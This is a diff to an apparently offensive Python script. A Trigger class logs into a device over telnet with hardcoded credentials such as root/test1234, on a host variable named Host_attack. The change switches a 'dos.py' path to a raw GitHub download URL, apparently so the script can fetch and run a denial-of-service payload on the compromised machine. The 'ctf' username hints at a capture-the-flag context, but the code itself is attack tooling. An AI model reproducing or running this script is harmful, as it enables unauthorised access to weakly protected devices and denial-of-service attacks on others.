@@ -6,7 +6,8 @@ class Trigger(object):
         pass
 
     #def login(self,Host,username=b'root',passwd=b'root'):
-    def login(self,Host_attack,username=b'root',passwd=b'test1234'):
+    #def login(self,Host_attack,username=b'root',passwd=b'tee001'):
+    def login(self,Host_attack,username,passwd):
         dev = telnetlib.Telnet(Host_attack,port=23)
         dev.set_debuglevel(2) #Debug mode
 
@@ -48,7 +49,8 @@ if __name__ == '__main__':
     Host_attack=b'153.0.0.171'
     username = b'ctf'
     passwd = b'test1234'
-    path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
+    #path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
+    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/20180907/dos.py'
     hack = Trigger()
     dev = hack.login(Host_ctrled,username,passwd)
     if not hack.checkIN(dev):
